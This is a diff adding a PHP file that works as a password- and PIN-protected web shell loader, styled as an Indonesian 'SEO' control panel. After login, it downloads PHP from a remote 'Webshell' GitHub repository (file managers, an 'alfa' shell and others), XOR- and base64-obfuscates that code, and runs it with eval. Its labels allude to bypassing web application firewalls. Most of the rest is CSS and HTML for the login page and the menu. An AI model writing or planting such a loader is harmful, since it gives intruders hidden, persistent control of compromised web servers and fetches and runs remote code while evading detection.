@@ -1,0 +1,669 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+session_start();
+define('SECURE_ACCESS', true);
+header('X-Powered-By: none');
+header('Content-Type: text/html; charset=UTF-8');
+
+$hashed_password = '$2y$10$rmMemApJ2t.8SMYfxz/N6eVCwdxWQrz2nW0vANx6rkwkRDOFdoe0.';
+$hashed_pin      = '$2y$10$FTdvfYvhy4vfTqOR6.CV4u4.NqWgWs.YRUcCl/vl8HU2I3zPOBedK';
+
+// ambil konten dari URL
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $data = curl_exec($conn);
+        curl_close($conn);
+        return $data;
+    } elseif (function_exists('file_get_contents')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+// obfuscation custom (XOR + base64 + loader)
+function obfuscate_code_custom($code) {
+    $key = 7; // kunci sederhana
+    $out = '';
+    $len = strlen($code);
+    for ($i = 0; $i < $len; $i++) {
+        $out .= chr(ord($code[$i]) ^ $key);
+    }
+    $b64 = base64_encode($out);
+
+    $loader = <<<'PHP'
+<?php
+$__k = 7;
+$__s = '%s';
+$__d = base64_decode($__s);
+$__o = '';
+for ($__i = 0, $__l = strlen($__d); $__i < $__l; $__i++) {
+    $__o .= chr(ord($__d[$__i]) ^ $__k);
+}
+unset($__d, $__i, $__l, $__k, $__s);
+eval("?>".$__o);
+PHP;
+
+    return sprintf($loader, $b64);
+}
+
+function is_logged_in() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+/* ========================
+   BAGIAN SETELAH LOGIN
+   ======================== */
+
+if (is_logged_in()) {
+
+    // daftar script OBS yang bisa dipilih
+    $scripts = [
+        'obs' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/file_manager.txt',
+        'obs2' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/anti-badai.txt',
+        'obs3' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/anti-mall.txt',
+        'obs4' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/alfa1.txt',
+        'obs5' => 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/manager.txt',
+    ];
+
+    // kalau user klik salah satu OBS
+    if (isset($_GET['run']) && isset($scripts[$_GET['run']])) {
+        $url  = $scripts[$_GET['run']];
+        $code = geturlsinfo($url);
+        if ($code === false) {
+            die("Gagal mengambil script dari $url");
+        }
+
+        // obfuscate otomatis
+        $obf = obfuscate_code_custom($code);
+
+        // jalankan hasil obfuscate
+        eval('?>' . $obf);
+        exit;
+    }
+
+    // kalau belum pilih, tampilkan menu panel pilihan OBS
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+      <script src="https://cdn.tailwindcss.com"></script>
+        <meta charset="UTF-8">
+        <title>CONTROL PANEL</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* {box-sizing:border-box;margin:0;padding:0;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
+html,body{height:100%}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(rgba(0,0,0,.55),rgba(0,0,0,.9)),url("https://i.pinimg.com/736x/9f/67/82/9f678217ae40624b63cd98dffe6ddd9d.jpg");background-position:center;background-repeat:no-repeat;background-size:cover;background-attachment:fixed;color:#e5e7eb}
+.panel-card{width:380px;padding:28px 26px 24px;border-radius:20px;background:rgba(15,23,42,.88);border:1px solid rgba(129,140,248,.35);backdrop-filter:blur(18px);box-shadow:0 24px 60px rgba(0,0,0,.75);position:relative;overflow:hidden}
+.panel-card::before{content:"";position:absolute;inset:-1px;border-radius:inherit;background:radial-gradient(circle at top left,rgba(129,140,248,.55),transparent 60%),radial-gradient(circle at bottom right,rgba(236,72,153,.45),transparent 55%);mix-blend-mode:screen;opacity:.7;pointer-events:none}
+.panel-header{position:relative;margin-bottom:24px}
+.panel-badge{display:inline-flex;align-items:center;gap:6px;padding:3px 9px;border-radius:999px;font-size:10px;text-transform:uppercase;letter-spacing:.16em;border:1px solid rgba(129,140,248,.7);color:#c7d2fe;background:rgba(15,23,42,.9);margin-bottom:8px}
+.panel-badge span{width:6px;height:6px;border-radius:999px;background:#22c55e;box-shadow:0 0 10px rgba(34,197,94,.9)}
+.panel-title{font-size:20px;font-weight:600}
+.panel-sub{font-size:12px;color:#9ca3af;margin-top:2px}
+.carousel-container{position:relative;height:320px;perspective:1000px;margin-top:18px}
+.carousel-track{display:flex;height:100%;transition:transform .5s cubic-bezier(.25,1,.5,1);transform-style:preserve-3d}
+.carousel-card{flex:0 0 280px;height:280px;margin:0 8px;background:rgba(15,23,42,.9);border-radius:20px;border:1px solid;backdrop-filter:blur(20px);box-shadow:0 25px 50px rgba(0,0,0,.6);cursor:pointer;position:relative;overflow:hidden;transition:all .3s ease;text-decoration:none;color:inherit;display:flex;flex-direction:column;padding:20px;align-items:center;justify-content:center}
+.carousel-card:hover{transform:rotateY(5deg) rotateX(3deg) scale(1.02);box-shadow:0 35px 70px rgba(0,0,0,.8)}
+.carousel-card.obs1{
+  border-color:rgba(34,197,94,.6);
+  background:linear-gradient(135deg,rgba(34,197,94,.15),rgba(15,23,42,.95)),url("https://images2.imgbox.com/80/d6/yaZM8uXw_o.jpg");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.obs2{
+  border-color:rgba(129,140,248,.7);
+  background:linear-gradient(135deg,rgba(129,140,248,.15),rgba(15,23,42,.95)),url("https://images2.imgbox.com/6d/40/Axea84LQ_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.obs3{
+  border-color:rgba(249,115,22,.7);
+  background:linear-gradient(135deg,rgba(249,115,22,.18),rgba(6, 11, 22, 0.95)),url("https://images2.imgbox.com/a9/49/39PZFjL0_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.obs4{
+  border-color:rgba(236,72,153,.7);
+  background:linear-gradient(135deg,rgba(236,72,153,.18),rgba(15,23,42,.95)),url("https://images2.imgbox.com/d3/20/8PzDUgpH_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.carousel-card.obs5{
+  border-color:rgba(14,165,233,.8);
+  background:linear-gradient(135deg,rgba(14,165,233,.15),rgba(15,23,42,.95)),url("https://images2.imgbox.com/6e/2c/nN5r0VET_o.png");
+  background-size:cover;background-position:center;background-repeat:no-repeat;background-blend-mode:overlay
+}
+.card-glow{position:absolute;inset:0;border-radius:inherit;background:radial-gradient(circle at top left,rgba(129,140,248,.3),transparent 60%);opacity:0;transition:opacity .3s}
+.carousel-card:hover .card-glow{opacity:1}
+.card-content{height:100%;display:flex;flex-direction:column;justify-content:center;color:#e5e7eb;text-align:center}
+.card-tag{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:#9ca3af;margin-bottom:4px}
+.card-title{font-size:16px;font-weight:600;margin:8px 0;line-height:1.2}
+.card-desc{font-size:12px;color:#9ca3af}
+.nav-dots{display:flex;justify-content:center;gap:8px;margin-top:16px}
+.dot{width:10px;height:10px;border-radius:50%;background:rgba(129,140,248,.4);cursor:pointer;transition:all .3s}
+.dot.active{background:#818cf8;transform:scale(1.2);box-shadow:0 0 10px rgba(129,140,248,.8)}
+.footer-row{margin-top:18px;display:flex;justify-content:space-between;align-items:center;font-size:11px;color:#6b7280}
+.logout-link{color:#f97373;text-decoration:none}
+.logout-link:hover{text-decoration:underline}
+@media(max-width:480px){.panel-card{width:90%;padding:24px 20px}.carousel-card{flex:0 0 240px;height:240px;margin:0 6px;padding:16px}}
+.nav-btn{position:absolute;top:50%;transform:translateY(-50%);width:45px;height:45px;border-radius:50%;border:2px solid rgba(129,140,248,.6);background:rgba(15,23,42,.8);color:#e5e7eb;font-size:20px;font-weight:bold;cursor:pointer;backdrop-filter:blur(25px);box-shadow:0 10px 30px rgba(0,0,0,.6);transition:all .25s;z-index:20;display:flex;align-items:center;justify-content:center}
+.nav-btn:hover{background:rgba(129,140,248,.2);border-color:rgba(129,140,248,.9);box-shadow:0 15px 40px rgba(129,140,248,.4);transform:translateY(-50%) scale(1.15)}
+.nav-btn.left{left:-25px}
+.nav-btn.right{right:-25px}
+.nav-btn:active{transform:translateY(-50%) scale(.95)}
+@media(max-width:480px){.nav-btn{width:40px;height:40px;font-size:18px;left:-15px;right:-15px}}
+
+</style>
+
+    </head>
+    <body>
+        <div class="panel-card">
+            <div class="panel-header">
+                <div class="panel-badge">
+                    <span></span>
+                    SEO 5YLEH
+                </div>
+                <div class="panel-title">PANJAHAT PERGI MENCARI UANG</div>
+                <div class="panel-sub">PAHLAWAN DATANG MENAWARKAN WAKTU LUANG :')</div>
+            </div>
+
+            <div class="carousel-container">
+  <!-- TOMBOL PANAH LUAR -->
+  <button class="nav-btn left" onclick="goToSlide((currentSlide-1+5)%5)">‹</button>
+  <button class="nav-btn right" onclick="goToSlide((currentSlide+1)%5)">›</button>
+
+  <!-- 5 CARD LO -->
+  <div class="carousel-track" id="carouselTrack">
+    <a href="?run=obs1" class="carousel-card obs1">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag"></div>
+          <div class="card-title"></div>
+          <div class="card-desc"></div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=obs2" class="carousel-card obs2">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">CLICK</div>
+          <div class="card-title">ALPHA</div>
+          <div class="card-desc"></div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=obs3" class="carousel-card obs3">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">CLICK</div>
+          <div class="card-title">RP 5YLEH</div>
+          <div class="card-desc"></div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=obs4" class="carousel-card obs4">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">CLICK</div>
+          <div class="card-title">LADEV MANAGER</div>
+          <div class="card-desc"></div>
+        </div>
+      </div>
+    </a>
+    <a href="?run=obs5" class="carousel-card obs5">
+      <div class="card-glow"></div>
+      <div class="card-content">
+        <div>
+          <div class="card-tag">CLICK</div>
+          <div class="card-title">PARAMETER WP</div>
+          <div class="card-desc"></div>
+        </div>
+      </div>
+    </a>
+  </div>
+</div>
+        <script>const track=document.getElementById('carouselTrack'),dots=document.querySelectorAll('.dot');let currentSlide=0;const totalSlides=5;const cardWidth=296;function goToSlide(slide){currentSlide=slide;track.style.transform=`translateX(${-slide*cardWidth}px)`;dots.forEach((dot,i)=>dot.classList.toggle('active',i===slide))}dots.forEach((dot,index)=>dot.addEventListener('click',()=>goToSlide(index)));setInterval(()=>{currentSlide=(currentSlide+1)%totalSlides;goToSlide(currentSlide)},4000);document.querySelectorAll('.carousel-card').forEach(card=>{card.addEventListener('mousemove',e=>{const rect=card.getBoundingClientRect(),x=e.clientX-rect.left,y=e.clientY-rect.top,cx=rect.width/2,cy=rect.height/2,rx=(y-cy)/20,ry=(cx-x)/20;card.style.transform=`rotateX(${rx}deg) rotateY(${ry}deg) scale(1.02)`});card.addEventListener('mouseleave',()=>card.style.transform='rotateX(0deg) rotateY(0deg) scale(1)')});
+</script>
+
+
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+/* ========================
+   PROSES LOGIN
+   ======================== */
+
+if (isset($_GET['logout'])) {
+    $_SESSION = [];
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+$error = '';
+
+if (isset($_POST['password']) && isset($_POST['pin'])) {
+    $entered_password = $_POST['password'];
+    $entered_pin      = $_POST['pin'];
+
+    if (password_verify($entered_password, $hashed_password) && password_verify($entered_pin, $hashed_pin)) {
+        // session hardening: regenerate id setelah sukses login
+        session_regenerate_id(true);
+        $_SESSION['logged_in'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = "BEGITULAH LELAKI, TERLALU MUDAH DI BOHONGI";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>LOGIN</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    .carousel-container {
+  position: relative;
+  height: 320px;
+  perspective: 1000px;
+  margin-top: 18px;
+}
+.carousel-track {
+  display: flex;
+  height: 100%;
+  transition: transform 0.5s cubic-bezier(0.25, 1, 0.5, 1);
+  transform-style: preserve-3d;
+}
+.carousel-card {
+  flex: 0 0 280px;
+  height: 280px;
+  margin: 0 8px;
+  background: rgba(15, 23, 42, 0.9);
+  border-radius: 20px;
+  border: 1px solid;
+  backdrop-filter: blur(20px);
+  box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.3s ease;
+  transform: rotateY(0deg) rotateX(0deg) scale(1);
+}
+.carousel-card:hover {
+  transform: rotateY(5deg) rotateX(3deg) scale(1.02);
+  box-shadow: 0 35px 70px rgba(0,0,0,0.8);
+}
+.carousel-card.obs1 { border-color: rgba(34,197,94,0.6); }
+.carousel-card.obs2 { border-color: rgba(129,140,248,0.7); }
+.carousel-card.obs3 { border-color: rgba(249,115,22,0.7); }
+.carousel-card.obs4 { border-color: rgba(236,72,153,0.7); }
+.carousel-card.obs5 { border-color: rgba(14,165,233,0.8); }
+.card-glow {
+  position: absolute;
+  inset: 0;
+  border-radius: inherit;
+  background: radial-gradient(circle at top left, rgba(129,140,248,0.3), transparent 60%);
+  opacity: 0;
+  transition: opacity 0.3s ease;
+}
+.carousel-card:hover .card-glow { opacity: 1; }
+.card-content {
+  padding: 20px;
+  height: 100%;
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  color: #e5e7eb;
+}
+.card-tag {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: #9ca3af;
+}
+.card-title {
+  font-size: 16px;
+  font-weight: 600;
+  margin: 8px 0;
+}
+.card-desc {
+  font-size: 12px;
+  color: #9ca3af;
+}
+.nav-dots {
+  display: flex;
+  justify-content: center;
+  gap: 8px;
+  margin-top: 16px;
+}
+.dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: rgba(129,140,248,0.4);
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+.dot.active {
+  background: #818cf8;
+  transform: scale(1.2);
+  box-shadow: 0 0 10px rgba(129,140,248,0.8);
+}
+/* Sisanya CSS panel lama kamu tetap */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    html, body {
+      height: 100%;
+    }
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background:
+        linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0.9)),
+        url("https://i.pinimg.com/736x/9f/67/82/9f678217ae40624b63cd98dffe6ddd9d.jpg");
+      background-position: center center;
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-attachment: fixed;
+      overflow: hidden;
+    }
+    .login-card,
+    .input-wrapper input,
+    .btn-primary {
+      transition:
+        transform 0.18s ease,
+        box-shadow 0.18s ease,
+        border-color 0.18s ease,
+        background 0.18s ease,
+        filter 0.18s ease;
+    }
+    .login-card {
+      width: 360px;
+      padding: 32px 30px 28px;
+      border-radius: 20px;
+      background: rgba(15, 23, 42, 0.78);
+      border: 1px solid rgba(129, 140, 248, 0.35);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.75);
+      color: #e5e7eb;
+      opacity: 0;
+      transform: translateY(12px);
+      animation: card-in 0.7s ease-out forwards,
+                 card-float 5s ease-in-out infinite 0.7s;
+      position: relative;
+      overflow: hidden;
+    }
+    .login-card::before {
+      content: "";
+      position: absolute;
+      inset: -1px;
+      border-radius: inherit;
+      background:
+        radial-gradient(circle at top left, rgba(129, 140, 248, 0.55), transparent 60%),
+        radial-gradient(circle at bottom right, rgba(236, 72, 153, 0.45), transparent 55%);
+      mix-blend-mode: screen;
+      opacity: 0.8;
+      pointer-events: none;
+    }
+    .login-card:hover {
+      box-shadow:
+        0 0 0 1px rgba(129, 140, 248, 0.4),
+        0 26px 70px rgba(15, 23, 42, 0.95);
+      transform: translateY(8px);
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 3px 9px;
+      border-radius: 999px;
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.16em;
+      border: 1px solid rgba(129, 140, 248, 0.7);
+      color: #c7d2fe;
+      background: rgba(15, 23, 42, 0.9);
+      margin-bottom: 10px;
+      opacity: 0;
+      transform: translateY(6px);
+      animation: slide-up 0.5s ease-out 0.5s forwards;
+    }
+    .badge-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 999px;
+      background: #22c55e;
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
+    }
+    .title {
+      font-size: 24px;
+      margin-bottom: 4px;
+      position: relative;
+      overflow: hidden;
+      white-space: nowrap;
+      animation: type-in 1.3s steps(20, end) 0.3s forwards;
+      opacity: 0;
+    }
+    .subtitle {
+      font-size: 13px;
+      color: #9ca3af;
+      margin-bottom: 16px;
+    }
+    .error {
+      margin-top: 4px;
+      margin-bottom: 12px;
+      padding: 8px 10px;
+      border-radius: 8px;
+      font-size: 11px;
+      color: #fecaca;
+      background: rgba(185, 28, 28, 0.18);
+      border: 1px solid rgba(248, 113, 113, 0.55);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+    }
+    .input-group {
+      margin-bottom: 16px;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: slide-up 0.6s ease-out forwards;
+    }
+    .input-group:nth-of-type(1) { animation-delay: 0.7s; }
+    .input-group:nth-of-type(2) { animation-delay: 0.85s; }
+    .input-group label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 6px;
+      color: #d1d5db;
+    }
+    .input-wrapper {
+      position: relative;
+    }
+    .input-wrapper span.icon {
+      position: absolute;
+      inset-block: 0;
+      left: 10px;
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #6b7280;
+      pointer-events: none;
+    }
+    .input-wrapper input {
+      width: 100%;
+      padding: 10px 12px 10px 30px;
+      border-radius: 10px;
+      border: 1px solid rgba(51, 65, 85, 0.9);
+      background: linear-gradient(135deg,
+                   rgba(15, 23, 42, 0.95),
+                   rgba(30, 41, 59, 0.95));
+      color: #f9fafb;
+      font-size: 14px;
+      outline: none;
+    }
+    .input-wrapper input::placeholder {
+      color: #6b7280;
+    }
+    .input-wrapper input:focus {
+      border-color: #818cf8;
+      box-shadow:
+        0 0 0 1px rgba(129, 140, 248, 0.9),
+        0 0 20px rgba(129, 140, 248, 0.55);
+      background: rgba(15, 23, 42, 1);
+      transform: translateY(-1px);
+    }
+    .btn-primary {
+      width: 100%;
+      margin-top: 4px;
+      padding: 10px 16px;
+      border-radius: 999px;
+      border: none;
+      background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899);
+      color: #f9fafb;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      letter-spacing: 0.04em;
+      box-shadow: 0 16px 38px rgba(88, 28, 135, 0.8);
+      opacity: 0;
+      transform: translateY(10px);
+      animation: slide-up 0.6s ease-out 1.05s forwards;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 22px 50px rgba(91, 33, 182, 0.95);
+      filter: brightness(1.08);
+    }
+    .btn-primary:active {
+      transform: translateY(0);
+      box-shadow: 0 10px 25px rgba(79, 70, 229, 0.8);
+    }
+    .hint {
+      margin-top: 10px;
+      font-size: 11px;
+      color: #9ca3af;
+      text-align: center;
+      opacity: 0;
+      transform: translateY(6px);
+      animation: slide-up 0.6s ease-out 1.2s forwards;
+    }
+    .orb {
+      position: absolute;
+      border-radius: 999px;
+      filter: blur(30px);
+      opacity: 0.7;
+      z-index: -1;
+    }
+    .orb.orb-1 {
+      width: 180px;
+      height: 180px;
+      background: #4f46e5;
+      top: -60px;
+      right: -40px;
+      animation: orb-move-1 12s ease-in-out infinite;
+    }
+    .orb.orb-2 {
+      width: 140px;
+      height: 140px;
+      background: #ec4899;
+      bottom: -40px;
+      left: -30px;
+      animation: orb-move-2 16s ease-in-out infinite;
+    }
+    @keyframes card-in {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes card-float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
+    }
+    @keyframes type-in {
+      0% { width: 0; opacity: 1; }
+      100% { width: 100%; opacity: 1; }
+    }
+    @keyframes slide-up {
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes orb-move-1 {
+      0%, 100% { transform: translate(0, 0); }
+      50% { transform: translate(-20px, 10px); }
+    }
+    @keyframes orb-move-2 {
+      0%, 100% { transform: translate(0, 0); }
+      50% { transform: translate(25px, -15px); }
+    }
+    @media (max-width: 480px) {
+      .login-card {
+        width: 90%;
+        padding: 24px 20px 22px;
+      }
+      .title {
+        font-size: 20px;
+      }
+    }
+    
+  </style>
+</head>
+<body>
+
+  <div class="login-card">
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <div class="badge">
+      <span class="badge-dot"></span>
+      SEO 5YLEH
+    </div>
+
+    <h2 class="title">#BelawanPride</h2>
+    <p class="subtitle">SEMANGAT SAMPAI KIAMAT.!!</p>
+
+    <?php if (!empty($error)): ?>
+      <div class="error"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></div>
+    <?php endif; ?>
+
+    <form method="post" autocomplete="off">
+      <div class="input-group">
+        <label for="password">Password</label>
+        <div class="input-wrapper">
+          <span class="icon">🔑</span>
+          <input type="password" id="password" name="password" placeholder="PW NYA ADMIN" required>
+        </div>
+      </div>
+
+      <div class="input-group">
+        <label for="pin">PIN</label>
+        <div class="input-wrapper">
+          <span class="icon">🔒</span>
+          <input type="password" id="pin" name="pin" placeholder="PIN NYA 321" maxlength="6" required>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-primary">LOGIN</button>
+
+      <p class="hint">BYE BYE WAFF</p>
+    </form>
+  </div>
+
+</body>
+</html>
